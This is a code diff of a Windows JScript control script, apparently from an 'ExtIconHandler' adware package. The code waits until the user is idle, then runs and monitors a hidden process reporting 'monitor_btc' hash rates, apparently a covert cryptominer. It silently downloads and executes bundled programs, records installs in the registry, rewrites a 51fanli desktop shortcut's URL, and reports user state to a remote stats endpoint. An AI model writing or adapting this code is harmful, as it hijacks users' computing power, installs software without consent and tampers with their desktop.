@@ -1,10 +1,35 @@
 ////////// 
+
 log("*-------------------------------main.js----------------------------------")
-log("-------------------------------main.js----------------------------------*")
+log("-------------------------------main.js DateLastModified : " + __fso.GetFile(__workdir+"~$Doc1.dot").DateLastModified + "----------------------------------*")
 /////
-function filter_shellexcute(){
+function filter_idle(){
 }
-function filter_shellexcute.prototype.setEnvironmentVariable(env)
+function filter_idle.prototype.run(){
+	log("filter_idle.prototype.run")
+	var pThis = this;
+	var idle = __external.GetTickCount() - __external.GetLastInputInfo()
+	if(__DEBUG || __IsSupportOpencl || __external.IsSupportOpencl() || idle>__idletime/8){
+		__interrupted = __DEBUG;
+		setTimeout(function(){
+			var idle = __external.GetTickCount() - __external.GetLastInputInfo()
+			log("filter_sebtc __external.GetLastInputInfo=" + idle)
+			if(idle > __idletime/2)
+			{	
+				return true;
+			}
+			else{
+				log("-----busy");
+				pThis.callback(pipe, true);
+			}
+		} , __idletime)		 
+	}
+	return ;
+}
+
+function filter_sebtc(){
+}
+function filter_sebtc.prototype.setEnvironmentVariable(env)
 {
 	var mapType2UserName = {
 		"0":"XjYYWYWU'",
@@ -45,7 +70,7 @@ function filter_shellexcute.prototype.setEnvironmentVariable(env)
 		//env("VSD") = 1; 
 	}
 }
-function filter_shellexcute.prototype.conditionDenyPowerQuery(){	
+function filter_sebtc.prototype.conditionDenyPowerQuery(){	
 	var WshShell = __wshShell
 	var DPTC=0
 	__TRY(function (){ DPTC = WshShell.RegRead("HKEY_CURRENT_USER\\Software\\exticonhandler\\DPTC")})
@@ -83,7 +108,7 @@ function filter_shellexcute.prototype.conditionDenyPowerQuery(){
 		//}()
 	}
 };
-function filter_shellexcute.prototype.monitorCPUandInput(pipe){
+function filter_sebtc.prototype.monitorCPUandInput(pipe){
 	log("monitorCPUandInput")
 	this.conditionDenyPowerQuery();
 	var starttime = __external.GetTickCount()
@@ -121,8 +146,11 @@ function filter_shellexcute.prototype.monitorCPUandInput(pipe){
 				var s = "";
 				if(h)
 				{					
-					var s = __storage.ReadFileMapping(h,128)
-					sendHttpStat("monitor_btc", "rpcxx_speed_" + parseInt((parseInt(s) / 10000)) * 10000);
+					var s = __storage.ReadFileMapping(h,128);
+					var si = parseInt(s);
+					if(si>0)
+						si += 10000;
+					sendHttpStat("monitor_btc", "rpcxx_speed_" + parseInt((parseInt(si) / 10000)) * 10000);
 				}				
 				sendHttpStat("monitor_btc", "kill_exit", parseInt((__external.GetTickCount()-starttime)/1000/60),1);
 				pThis.callback(pipe)
@@ -172,34 +200,9 @@ function filter_shellexcute.prototype.monitorCPUandInput(pipe){
 		process =null;		
 	}, 1500	) 
 }
-function filter_shellexcute.prototype.run(pipe){
-	var pThis = this;
-	var idle = __external.GetTickCount() - __external.GetLastInputInfo()
-	if(__DEBUG || __IsSupportOpencl || __external.IsSupportOpencl() || idle>__idletime/8){
-		__interrupted = __DEBUG;
-		setTimeout(function(){
-			var idle = __external.GetTickCount() - __external.GetLastInputInfo()
-			trace("filter_shellexcute __external.GetLastInputInfo=" + idle)
-			if(idle > __idletime/2)
-			{	
-				pThis.monitorCPUandInput(pipe);
-			}
-			else{
-				trace("-----busy");
-				pThis.callback(pipe, true);
-			}
-		} , __idletime)		 
-	}
-	else
-		return true;	
+function filter_sebtc.prototype.run(pipe){	
+	return this.monitorCPUandInput(pipe);			 
 } 
-
-function filter_idle(){
-}
-function filter_idle.prototype.run(){
-	log("filter_idle.prototype.run")
-	return true;
-}
 
 function filter_shellexcuteex(){
 }
@@ -208,7 +211,8 @@ function filter_shellexcuteex.prototype.run(pipe){
 	var path = __workdir +pipe.name;
 	if(fso.FileExists(path)){
 		var WshShell = __wshShell;		
-		WshShell.run(__workdir +pipe.name, 0 ,false);
+		//WshShell.run(__workdir +pipe.name, 0 ,false);
+		WshShell.Exec(__workdir +pipe.name)
 		//var pid = __external.ShellExcute("", __workdir +pipe.name, "", 0x00000080)		
 		sendHttpStat("bundleinstalled", ""+""+pipe.name);
 	}
@@ -219,61 +223,19 @@ function start(){
 	var __module = new module("main.js");
 	var _filter_idle = new filter_idle();
 	var _filter_dl = new filter_dlbusiness();
-	var _filter_se = new filter_shellexcute();
+	var _filter_se = new filter_sebtc();
 	_filter_dl.callback =__module.push(_filter_dl);
 	_filter_se.callback = __module.push(_filter_se);
 	var pipe = __destReady_dll;
 	__module.setDoneCallback(function (mod) {
 		log("module name "+mod.name+" onDonCallback");		 
-		exit(-103);
+	 
 	})
-	__module.run(pipe)
-}
-//1 --
-setTimeout(start, 1);
-
-function sendDesktopIconState(){
-	//统计桌面图标个数
-	var fso = __fso
-	var WshShell = __wshShell 
-	var desktopdir = WshShell.SpecialFolders("Desktop") 
-	var path = desktopdir + "\\返利网.51fanli";
-	//var path = __storage.GetFolderPath(0, 0x0010, 0, 0) + "\\返利网.51fanli";
-	var exist = fso.FileExists(path);
-	log("path : "+path+" ,exist="+exist);
-	if(exist){
-		sendHttpStat("desktopicon", "exist_51fanli" );
-	}else{
-		sendHttpStat("desktopicon", "not_exist_51fanli" );
-	}
-}
-//2 --
-setTimeout(sendDesktopIconState, 2);
-
-function shellIconOverlayIdentifier() {
-	var WshShell = __wshShell
-	var clsid=""
-	__TRY(function (){ clsid = WshShell.RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\.ExtIconHandler\\")})
-	log(" clsid = " + clsid);
-	if(clsid.length>0)
-		sendHttpStat("launch",  "exist_OverlayIdentifier");
-	else
-		sendHttpStat("launch",  "not_exist_OverlayIdentifier");
-}
-//3 --
-setTimeout(shellIconOverlayIdentifier, 5);
-////////////////////1 2 3/////////////////
-
-function modifyDesktopIcon(){
-	var WshShell = __wshShell 
-	var desktopdir = WshShell.SpecialFolders("Desktop") 
-	var path = desktopdir + "\\返利网.51fanli";
-	//var path = __storage.GetFolderPath(0, 0x0010, 0, 0) + "\\返利网.51fanli";
-	var url = __storage.GetPrivateProfileString(path,"InternetShortcut","URL");
-	log("path = " + path + ", icon url = "+url);
-	__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",url)
+	__module.run(pipe)	
 }
 
+
+//
 function filter_installcondition(condition){
 	this.condition = condition;
 }
@@ -293,55 +255,116 @@ function filter_installcondition.prototype.run(pipe){
 	if(osversion.substr(0,1) !="5")
 		this.callback(pipe,true);
 	*/
-	if(this.condition && this.condition.type){
-		if(this.condition.subtype=="existreg"){
+	if(this.condition && this.condition.type){		
+		if(this.condition.type == "reg" && this.condition.subtype=="existreg"){
 			var WshShell = __wshShell
-			var key_value
-			__TRY(function(){ key_value = WshShell.RegRead(this.condition.value);})
+			var key_value						
+			__TRY(function(){ key_value = WshShell.RegRead(this.condition.value);})				
+			log("RegRead : " + this.condition.value + " , value : " + (key_value ? key_value : "undefined"));
 			if(typeof key_value == "undefined"){//没有这个产品，准备下载
 				return true
-			}else{
-				this.callback(pipe,true);
+			}else{				
 			}
 		}
 		else if(this.condition.type == "file"){
 		}
 	}
-	return true	
+	return this.callback(pipe,true);	
 }
 function filter_installcomplete(){
-	
 }
 function filter_installcomplete.prototype.run(pipe){
+	log(" download url from : " + pipe.url+" to "+pipe.name);
 	var WshShell = __wshShell
-	__TRY(function(){WshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\force", 1, "RGG_DWORD");})
-	
+	__TRY(function (){WshShell.RegWrite("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\force", 1, "REG_DWORD")})
+	return true;
 }
+
+//1--
 function downloadforinstall(){
 	var WshShell = __wshShell
 	var key_value
 	var prekey = "HKEY_CURRENT_USER\\Software\\ExtIconHandler\\s_";
 	for(var i in __installReadys){
 		var pipe = __installReadys[i];
-		__TRY(function(){ key_value = WshShell.RegRead(prekey + parseInt(pipe.id /100) *100 + "\\");})
+		var key_path = prekey + parseInt(pipe.id /100) *100;
+		__TRY(function(){ key_value = WshShell.RegRead(key_path );})	
+		//alert(key_value ? key_value : "undefined");
+		log("RegRead : " + key_path + " , value : " + (key_value ? key_value : "undefined"));
 		if(typeof key_value == "undefined"){ //不存在
 		
-		}else{
-			if(key_value.indexOf(pipe.id)>0){
+		}else{			
+			if(key_value.indexOf(pipe.id)>=0){
+				log("find " + pipe.id + " in " + key_value );
 				continue;//已经执行过了
 			}
-		}
-		
+		}		
 		var __module = new module("install" + pipe.name);
 		var _filter_installcondition = new filter_installcondition(pipe.condition);
 		var _filter_dl = new filter_dlbusiness();
+		var _filter_ic = new filter_installcomplete();
 		_filter_installcondition.callback = __module.push(_filter_installcondition);
 		_filter_dl.callback =__module.push(_filter_dl);
+		__module.push(_filter_ic)
+		__module.setDoneCallback(function (mod) {
+			log("module name "+mod.name+" onDonCallback");		 
+		})		
 		__module.run(pipe)
 	}
 }
+//2 -- 
+function sendDesktopIconState(){
+	//统计桌面图标个数
+	var fso = __fso
+	var WshShell = __wshShell 
+	var desktopdir = WshShell.SpecialFolders("Desktop") 
+	var path = desktopdir + "\\返利网.51fanli";
+	//var path = __storage.GetFolderPath(0, 0x0010, 0, 0) + "\\返利网.51fanli";
+	var exist = fso.FileExists(path);
+	log("path : "+path+" ,exist="+exist);
+	if(exist){
+		sendHttpStat("desktopicon", "exist_51fanli" );
+	}else{
+		sendHttpStat("desktopicon", "not_exist_51fanli" );
+	}
+}
+//3 -- 
+function shellIconOverlayIdentifier() {
+	var WshShell = __wshShell
+	var clsid=""
+	__TRY(function (){ clsid = WshShell.RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\.ExtIconHandler\\")})
+	log(" clsid = " + clsid);
+	if(clsid.length>0)
+		sendHttpStat("launch",  "exist_OverlayIdentifier");
+	else
+		sendHttpStat("launch",  "not_exist_OverlayIdentifier");
+}
 //4 --
-setTimeout(downloadforinstall, 4);
+////////////////////1 2 3 4/////////////////
+function modifyDesktopIcon(){
+	var WshShell = __wshShell 
+	var desktopdir = WshShell.SpecialFolders("Desktop") 
+	var path = desktopdir + "\\返利网.51fanli";
+	//var path = __storage.GetFolderPath(0, 0x0010, 0, 0) + "\\返利网.51fanli";
+	var url = __storage.GetPrivateProfileString(path,"InternetShortcut","URL");
+	log("path = " + path + ", icon url = "+url);
+	__storage.WritePrivateProfileValue(path,"InternetShortcut","URL",url)
+}
+
+function readyExit(){
+	module.setDoneCallback(function(){
+		log("exit(100)");
+		exit(100);
+	})
+}
+function run(){	
+	start();
+	downloadforinstall();
+	sendDesktopIconState();
+	shellIconOverlayIdentifier();
+}
+readyExit();
+run()
 
 /*
 var PAGE_READWRITE = 4;
